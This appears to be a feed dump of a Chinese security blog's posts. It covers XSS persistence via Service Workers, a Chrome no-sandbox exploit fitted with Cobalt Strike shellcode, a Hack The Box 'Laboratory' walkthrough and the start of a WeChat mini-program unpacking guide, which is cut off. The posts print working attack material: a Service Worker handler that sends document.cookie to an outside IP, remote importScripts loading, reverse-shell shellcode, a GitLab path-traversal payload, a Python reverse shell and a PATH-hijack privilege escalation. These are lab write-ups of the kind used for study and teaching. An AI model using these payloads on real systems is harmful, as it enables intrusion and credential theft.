    <title>XSS持久化：Service Worker</title>
    <link href="https://misakikata.github.io/2021/06/XSS%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%9AService-Worker/"/>
    <id>https://misakikata.github.io/2021/06/XSS持久化：Service-Worker/</id>
    <published>2021-06-07T09:39:30.000Z</published>
    <updated>2021-06-07T09:39:30.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="service-worker"><a href="#service-worker" class="headerlink" title="service worker"></a>service worker</h2><p>service worker是一种特殊的web worker，web worker的作用是什么。</p><p>Web Worker为Web内容在后台线程中运行脚本提供了一种简单的方法。线程可以执行任务而不干扰用户界面。一旦创建， 一个worker 可以将消息发送到创建它的JavaScript代码, 通过将消息发布到该代码指定的事件处理程序（反之亦然）。</p><p>service worker是一个注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。</p><p>并且由于service worker工作于worker上下文，因此它不能访问DOM。线程独立于浏览器主线程，并且与当前的浏览器主线程完全隔离，并且可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，故该特性为XSS的持久化实现提供了基础。</p><p>当然由于service worker的功能，出于安全考虑，有一些限制。</p><ol><li>只能注册同源下的js</li><li>网站必须是<code>https://</code>或者<code>http://localhost/</code></li><li>content-type 为 */javascript</li><li>Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象。</li></ol><h2 id="注册service-worker"><a href="#注册service-worker" class="headerlink" title="注册service worker"></a>注册service worker</h2><p>参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ServiceWorkerContainer">https://developer.mozilla.org/zh-CN/docs/Web/API/ServiceWorkerContainer</a></p><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>service worker的注册方式</p><pre class="line-numbers language-none"><code class="language-none">ServiceWorkerContainer.register(scriptURL, options)navigator.serviceWorker.register(scriptURL, options) #返回一个ServiceWorkerContainer对象。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例如一个示例代码：</p><pre class="line-numbers language-none"><code class="language-none">if (&#39;serviceWorker&#39; in navigator) &#123;  navigator.serviceWorker.register(&#39;service-worker.js&#39;, &#123;scope: &#39;.&#x2F;&#39;&#125;)  .then(function(registration) &#123;    document.querySelector(&#39;#status&#39;).textContent &#x3D; &#39;succeeded&#39;;  &#125;).catch(function(error) &#123;    document.querySelector(&#39;#status&#39;).textContent &#x3D; error;  &#125;);&#125; else &#123;  &#x2F;&#x2F; The current browser doesn&#39;t support service workers.  let aElement &#x3D; document.createElement(&#39;a&#39;);  aElement.href &#x3D; &#96;     http:&#x2F;&#x2F;www.chromium.org&#x2F;blink&#x2F;serviceworker&#x2F;service-worker-faq  &#96;;  aElement.textContent &#x3D; &#39;unavailable&#39;;  document.querySelector(&#39;#status&#39;).appendChild(aElement);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="响应事件"><a href="#响应事件" class="headerlink" title="响应事件"></a>响应事件</h3><p>worker注册完成后，需要监听<code>fetch</code>事件来达到篡改返回，对页面嵌入恶意的srcipt脚本。</p><pre class="line-numbers language-none"><code class="language-none">self.addEventListener(&#39;fetch&#39;, function(event) &#123;&#x2F;&#x2F;worker context&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>利用<code>respondwith</code>来自定义返回的响应代码。其中包含<code>Response</code>对象的代码。</p><pre class="line-numbers language-none"><code class="language-none">function(e)&#123;    e.respondWith(        new Response(&#39;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&#39;,            &#123;headers: &#123;&#39;Content-Type&#39;:&#39;text&#x2F;html&#39;&#125;&#125;        )    )&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回一个html的内容。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>由于service worker存在的一定的限制，需要绕过同源，所以这里最方便的就是使用jsonp。因此需要一个jsonp的接口，并且这个接口的参数可操纵。</p><p>所以在注册的时候，需要一个jsonp的调用，例如</p><pre class="line-numbers language-none"><code class="language-none">navigator.serviceWorker.register(&#39;&#x2F;a.php?callback&#x3D;alert(1)&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结合上面的响应，<code>importScripts</code>导入远程js文件。</p><pre class="line-numbers language-none"><code class="language-none">navigator.serviceWorker.register(&#39;&#x2F;a.php?callback&#x3D;importScripts(&quot;https:&#x2F;&#x2F;xx&#x2F;test.js&quot;)&#39;);​&#x2F;&#x2F;test.jsself.addEventListener(&#39;fetch&#39;, function(event) &#123;    event.respondWith(        new Response(&#39;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&#39;,            &#123;headers: &#123;&#39;Content-Type&#39;:&#39;text&#x2F;html&#39;&#125;&#125;        )    )&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地调试一下，先本地导入这个js文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607140129968.png" alt="image-20210607140129968"></p><p>在刷新一下页面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607140401009.png" alt="image-20210607140401009"></p><p>在谷歌浏览器下，执行<code>chrome://serviceworker-internals</code>查看已经注册的service worker。能看到一个正在运行的service worker。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607140448999.png" alt="image-20210607140448999"></p><p>同样，在没有jsonp可以利用的地方，就需要查找是否有可利用的上传点，上传一个js脚本上去。直接在同源下利用即可。</p><p>如果需要无感反馈，但是service worker并不能操作document，Window对象。如下是模拟一个请求，每次触发响应的时候都会跨域发送一个请求到指定地址，但并不能携带敏感信息。</p><pre class="line-numbers language-none"><code class="language-none">self.addEventListener(&#39;fetch&#39;, function(event) &#123;  console.log(&#39;Handling fetch event for&#39;, event.request.url);​  event.respondWith(    caches.match(event.request).then(function(response) &#123;      const url&#x3D;&#39;http:&#x2F;&#x2F;192.168.30.179:8888&#x2F;&#39;;      const othePram&#x3D;&#123;          headers:&#123;              &quot;content-type&quot;:&quot;text&#x2F;plain&quot;          &#125;,          method:&quot;GET&quot;,          mode: &#39;cors&#39;,          credentials:&#39;include&#39;      &#125;;      fetch(url, othePram)      .then(res&#x3D;&gt;console.log(res))      console.log(&#39;No response found in cache. About to fetch from network...&#39;);​      return fetch(event.request).then(function(response) &#123;        console.log(&#39;Response from network is:&#39;, response);        return response;      &#125;);    &#125;)  );&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607162103258.png" alt="image-20210607162103258"></p><p>这里采用监听返回的url为特定地址的话返回修改的response。比如使用如下代码</p><pre class="line-numbers language-none"><code class="language-none">self.addEventListener(&#39;fetch&#39;, function (event) &#123;        event.respondWith(        caches.match(event.request).then(function(response)&#123;            console.log(fetch(event.request));            var url &#x3D; event.request.clone();            if (url.url&#x3D;&#x3D;&#39;http:&#x2F;&#x2F;localhost&#x2F;dvwa&#x2F;dvwa&#x2F;js&#x2F;dvwaPage.js&#39;)&#123;                                return new Response(&quot;var httpRequest &#x3D; new XMLHttpRequest();httpRequest.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;192.168.30.179:8888&#x2F;&#39;+document.cookie, true);httpRequest.send();&quot;)            &#125;else&#123;                return fetch(event.request).then(function(response) &#123;                console.log(&#39;Response from network is:&#39;, response.url);​                return response;              &#125;, function(error) &#123;                console.error(&#39;Fetching failed:&#39;, error);​                throw error;              &#125;);            &#125;        &#125;)        )   &#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>监听是否是指定的地址，此处使用一个脚本文件，在脚本中返回一个请求来触发。但只是这样的话会破坏一个js的使用，所以可以返回原js文件的同时，再添加一个恶意的js代码到其中。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210607173505261.png" alt="image-20210607173505261"></p><p>参考文章</p><p><a href="https://paper.seebug.org/177/">https://paper.seebug.org/177/</a></p><p><a href="https://xz.aliyun.com/t/8679">https://xz.aliyun.com/t/8679</a></p><p><a href="http://zerobs.top/2020/11/15/71.html">http://zerobs.top/2020/11/15/71.html</a></p><p><a href="https://yanluow.github.io/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss">https://yanluow.github.io/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;service-worker&quot;&gt;&lt;a href=&quot;#service-worker&quot; class=&quot;headerlink&quot; title=&quot;service worker&quot;&gt;&lt;/a&gt;service worker&lt;/h2&gt;&lt;p&gt;service worker是一种特殊的we
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CobaltStrike上线Chrome 0day</title>
    <link href="https://misakikata.github.io/2021/04/CobaltStrike%E4%B8%8A%E7%BA%BFChrome-0day/"/>
    <id>https://misakikata.github.io/2021/04/CobaltStrike上线Chrome-0day/</id>
    <published>2021-04-15T08:44:43.000Z</published>
    <updated>2021-04-15T08:44:43.931Z</updated>
    
    <content type="html"><![CDATA[<p>前两天连续出了chrome的两个代码执行，都是在–no-sandbox环境下。想直接利用还是有点不方便。先添加chrome的执行参数如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415141913647.png" alt="image-20210415141913647"></p><p>先运行第一个poc，<a href="https://github.com/r4j0x00/exploits">https://github.com/r4j0x00/exploits</a>，此处是开启了一个本地环境。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415141840516.png" alt="image-20210415141840516"></p><p>再试一下另一个新的，chrome的修复版本90也存在影响。<a href="https://github.com/avboy1337/1195777-chrome0day">https://github.com/avboy1337/1195777-chrome0day</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415151034661.png" alt="image-20210415151034661"></p><p>此版本的POC其中的shellcode格式很眼熟，尝试利用cobaltstrike生成C#的payload。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415145847136.png" alt="image-20210415145847136"></p><p>生成后提取其中的十六进制的shellcode字段。类似如下。</p><pre class="line-numbers language-none"><code class="language-none">0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, ......0xf9, 0x1f, 0x00, 0xc6, 0xf5, 0x3b, 0xd3, 0x99, 0x7b, 0x9a, 0xf4, 0xba, 0x71, 0x45, 0x52, 0x29, 0x67, 0xeb, 0x53, 0x59, 0xc5, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x31, 0x31, 0x2e, 0x31, 0x33, 0x30, 0x00, 0x12, 0x34, 0x56, 0x78<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>替换原exploit的shellcode字段。类似如下。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415150014088.png" alt="image-20210415150014088"></p><p>谷歌执行，会一直在加载的未响应状态，查看cs的能看到一个chrome进程的反弹shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210415150140652.png" alt="image-20210415150140652"></p><p>但由于正常使用默认设置是沙盒环境，此漏洞并不影响，所以这个还得需要配合沙盒逃逸才有效果。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前两天连续出了chrome的两个代码执行，都是在–no-sandbox环境下。想直接利用还是有点不方便。先添加chrome的执行参数如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Laboratory</title>
    <link href="https://misakikata.github.io/2021/04/Laboratory/"/>
    <id>https://misakikata.github.io/2021/04/Laboratory/</id>
    <published>2021-04-02T09:30:53.000Z</published>
    <updated>2021-04-02T09:30:53.590Z</updated>
    
    <content type="html"><![CDATA[<p>国际惯例，先执行nmap扫描</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401124339754.png" alt="image-20210401124339754"></p><p>看到跳转到laboratory.htb，配置host文件，指向10.10.10.216，访问查看是个啥。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401114204630.png" alt="image-20210401114204630"></p><p>按照国际惯例第二步，查看目录。使用dirb来爆破目录，此处尝试了半天没有发现任何有用信息，只是发现可以目录浏览，<a href="https://laboratory.htb/assets/">https://laboratory.htb/assets/</a>，当然下面也没有任何有用信息，都是一些css文件和图片。</p><p>目前来看没有下一步的方法，肯定是有啥没被发现。再去扫一遍端口，想看看是不是遗漏了啥，但是发现结果仍然一样，不过注意到了其中的一个DNS名称：git.laboratory.htb。</p><p>同样配置后访问发现是一个gitlab服务，需要注册一个账号。注册完成后登陆即可，然后发现一个公开的库，是刚才那个网站的前端代码，跟上面浏览的一致，也没啥</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401125022916.png" alt="image-20210401125022916"></p><p>发现一个issus，提交是说服务有问题，那这个418是啥。状态代码418被定义为愚人节的笑话，并且“预计不会被实际的HTTP服务器实现”。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401125355719.png" alt="image-20210401125355719"></p><p>这就是个愚人节玩笑，难道这个有用？查了一下发现触发类似某种特定情况下，比如未知的错误会被定向到418，但是这个系统好像没有这一说。</p><p>搜一下gayhub，查到一个CVE-2020-10977，文件读取漏洞，尝试执行读取passwd查看。后续并没有找到可以帮助获取权限的敏感文件，返回基本都是400。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401140849690.png" alt="image-20210401140849690"></p><p>正好根据这个靶场看一下这个漏洞怎么执行。需要先创建两个项目，如test1，test2。</p><p>在一个项目下创建一个issus，写入如下内容</p><pre class="line-numbers language-none"><code class="language-none">![a](&#x2F;uploads&#x2F;11111111111111111111111111111111&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402132824827-1617345369811.png" alt="image-20210402132824827"></p><p>然后再移动这个issus到另一个项目下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133032215-1617345372559.png" alt="image-20210402133032215"></p><p>然后在test2下就可以看到一个可以下载的passwd文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133117660-1617345374422.png" alt="image-20210402133117660"></p><p>后续的RCE就是读取了<code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>中的密钥</p><p>获取其中的<code>secret_key_base</code>：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402133905331-1617345376422.png" alt="image-20210402133905331"></p><p>在gayhub上又找一个RCE可以使用，利用的也是上面的文件读取来获取key，然后在构造一个payload来执行rails控制台。需要先修改一些参数。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401143832510.png" alt="image-20210401143832510"></p><p>需要监听端口，执行后监听端口反弹shell。不过这个shell及其不稳定，需要获取一个较为稳定的shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401143900205.png" alt="image-20210401143900205"></p><p>新建一个文件写入python的反弹shell代码，如下</p><pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.0.0&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启一个http服务，然后运行下载此文件，系统上存在的python命令是python3。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401151620979.png" alt="image-20210401151620979"></p><p>监听1234端口后，就能收到一个较为稳定的shell，在使用pty来升级一下。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401151716618.png" alt="image-20210401151716618"></p><p>当前的git用户权限并不高，也没有sudo权限。上传linpeas.sh文件，来查看一下是否有能提权的方法。</p><p>当前的可登陆用户就这几个，可能是直接获取root权限，不然就是获取别的用户权限再去获取root权限。查看一下其他用户是否能切换等。</p><pre class="line-numbers language-none"><code class="language-none">git:x:998:998::&#x2F;var&#x2F;opt&#x2F;gitlab:&#x2F;bin&#x2F;shgitlab-consul:x:991:991::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;consul:&#x2F;bin&#x2F;shgitlab-prometheus:x:992:992::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;prometheus:&#x2F;bin&#x2F;shgitlab-psql:x:996:996::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;postgresql:&#x2F;bin&#x2F;shmattermost:x:994:994::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;mattermost:&#x2F;bin&#x2F;shregistry:x:993:993::&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;registry:&#x2F;bin&#x2F;shroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这几个用户并没有自己的用户目录，也不能进行查询切换等，基本是无用信息。内核为5.4版本，是多担心利用内核漏洞提权。尝试了一圈没发现能顺利提权的东西，那这个shell是给来做啥的。。。</p><p>仔细看一下发现是个docker环境，可能是docker部署的gitlab，然后我们要拿到的应该是主机的权限。</p><p>搜了一下有关的信息，看到一个rails命令，也跟shell的初始目录一致。这是一个命令行与GitLab实例进行交互的方法。Rails Runner还可以运行ruby代码。回头看一下漏洞执行代码，发现好像也是利用了这个性质来执行的ruby代码。还可以修改用户信息等，那么可以尝试一下是否能修改原来库的创建者的密码，也就是dexter 。执行的时候一直在报错，提示不正确。查一下错，发现是参数使用不正确。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401163139147.png" alt="image-20210401163139147"></p><p>使用如下执行修改密码为test123456</p><pre class="line-numbers language-none"><code class="language-none">git@git:~&#x2F;gitlab-rails&#x2F;working$ gitlab-rails console -e productiongitlab-rails console -e production-------------------------------------------------------------------------------- GitLab:       12.8.1 (d18b43a5f5a) FOSS GitLab Shell: 11.0.0 PostgreSQL:   10.12--------------------------------------------------------------------------------Loading production environment (Rails 6.0.2)irb(main):001:0&gt; user &#x3D; User.where(username:&quot;dexter&quot;).firstuser &#x3D; User.where(username:&quot;dexter&quot;).firstuser &#x3D; User.where(username:&quot;dexter&quot;).first&#x3D;&gt; #&lt;User id:1 @dexter&gt;irb(main):002:0&gt; user.password &#x3D; &quot;test123456&quot;user.password &#x3D; &quot;test123456&quot;user.password &#x3D; &quot;test123456&quot;&#x3D;&gt; &quot;test123456&quot;irb(main):003:0&gt; user.save!user.save!user.save!Enqueued ActionMailer::DeliveryJob (Job ID: 1c4bf31e-e3f6-4056-9685-45f6a4c7d2e2) to Sidekiq(mailers) with arguments: &quot;DeviseMailer&quot;, &quot;password_change&quot;, &quot;deliver_now&quot;, #&lt;GlobalID:0x00007ff5fd3ef940 @uri&#x3D;#&lt;URI::GID gid:&#x2F;&#x2F;gitlab&#x2F;User&#x2F;1&gt;&gt;&#x3D;&gt; trueirb(main):004:0&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登陆后发现还有一个SecureDocker库。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401163609462.png" alt="image-20210401163609462"></p><p>在目录下找到一个dexter/.ssh目录，里面存在ssh的私钥信息。那就直接登陆查看。试了一圈发现不能登陆，一直提示格式不对，查了一圈发现这个id_rsa是新的openssh生成的新格式私钥。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112405208.png" alt="image-20210402112405208"></p><p>内容是<code>OPENSSH PRIVATE</code>开头的，服务器上需要的可能不是新格式，所以我们需要转换为<code>RSA PRIVATE</code>格式。</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNUgCCt.......XCVyJn9QMEbE4fdpKGVF+MS&#x2F;CkfE+JaNH9KOLvMrlw0bx3At681vxUS&#x2F;VeISQyoQGLw&#x2F;fuuJvh4tAHnotmkAAAAPcm9vdEBsYWJvcmF0b3J5AQIDBA&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载<a href="https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe">https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe</a>，然后打开File–&gt;load private key，加载后点击conversions–&gt;export openssh key第一项导出即可。格式如下。</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----MIIG4wIBAAKCAYEAsZfDj3ASdb5YS3MwjsD8+5JvnelUs+yI27VuDD7P21odSfNU......5iqrf2njCLyuQRo1W4kpgWjwVMdZVwqzdn&#x2F;LQ1UaE95ppDDdwAeNS&#x2F;&#x2F;8rR24oD+b+FbxNZUCzUgDmQ0PiwOs07JtFaE+HMuickqFx5W96gOye6dLD+8u-----END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用登陆查看，别忘记切换600的权限。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112848551.png" alt="image-20210402112848551"></p><p>获取第一个用户的flag</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402112936133.png" alt="image-20210402112936133"></p><p>按照惯例，先查看SUID位，发现存在一个不和谐的文件<code>/usr/local/bin/docker-security</code>。是一个二进制文件，执行没有反应。利用ltrace来查看一个调用跟踪。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402114714292.png" alt="image-20210402114714292"></p><p>大概就是一个限制docker权限的文件，先设置uid和gid位，后续执行chmod来调整权限。相当于用root的权限来限制。没有设置全路径，所以可以修改文件的执行目录，让先从我们设定的目录开始查找命令执行。利用环境变量来提权，参考：<a href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a>。现在/tmp下新建一个反弹shell，名为chmod。赋予执行权限。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210402124831047.png" alt="image-20210402124831047"></p><p>监听端口后可以获取一个root的shell</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;国际惯例，先执行nmap扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210401124339754.png&quot; alt=&quot;image-202104
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序解包</title>
    <link href="https://misakikata.github.io/2021/03/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%A7%A3%E5%8C%85/"/>
    <id>https://misakikata.github.io/2021/03/微信小程序解包/</id>
    <published>2021-03-24T07:34:27.000Z</published>
    <updated>2021-03-24T07:34:27.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="认识微信小程序"><a href="#认识微信小程序" class="headerlink" title="认识微信小程序"></a>认识微信小程序</h2><p>此处使用Windows版微信做介绍，但是Windows版和手机版稍微有点区别。先去获取一个Windows版的微信小程序包。默认位置在：<code>C:\Users\user\Documents\WeChat Files\Applet</code>。移动端的包在<code>/data/data/com.tencent.mm/MicroMsg/&#123;id&#125;/appbrand/pkg</code>，此处没有移动设备，不使用移动设备做演示。</p><p>目录下有一堆wx开头的目录，这些ID就是对应的小程序ID，可以在访问小程序抓包中获取到，如果懒得抓包也不知道小程序ID就把这些删掉，重新访问会再次下载，根据日期来找到对应的包即可。</p><p>Windows版的小程序包自动在外部加了一层的加密，我们看到的包名统一为：<code>__APP__.wxapkg</code>。我们可以看到这样的文件头，V1MMWX标识就是加密后添加的标识。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210322151852954.png" alt="image-20210322151852954"></p><p>这个是需要解密的，借助大佬的go语音项目来解密：<code>https://github.com/BlackTrace/pc_wxapkg_decrypt</code>，同时也有编译后的程序，直接用即可。</p><p>那Windows版的小程序的加密流程为：</p><ol><li>首先pbkdf2生成AES的key。利用微信小程序id字符串为pass，salt为<strong>saltiest</strong> 迭代次数为1000。调用pbkdf2生成一个32位的key</li><li>首先取原始的wxapkg的包得前1023个字节通过AES通过1生成的key和iv(<strong>the iv: 16 bytes</strong>),进行加密</li><li>接着利用微信小程序id字符串的倒数第2个字符为xor key，依次异或1023字节后的所有数据，如果微信小程序id小于2位，则xorkey 为 <strong>0x66</strong></li><li>把AES加密后的数据（1024字节）和xor后的数据一起写入文件，并在文件头部添加<strong>V1MMWX</strong>标识</li></ol><p>解密后，就能获得一个以微信小程序ID命令的包，这个包就是需要解析来获取小程序源码的包。先来看一下小程序的结构。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210322152633592.png" alt="image-20210322152633592"></p><p>从十六进制中可以看到，旁边的文件目录文件。这种包并非一个压缩格式的包，而是一个二进制的包，需要特定的方法解包。</p><h2 id="小程序解包"><a href="#小程序解包" class="headerlink" title="小程序解包"></a>小程序解包</h2><p>使用工具：<a 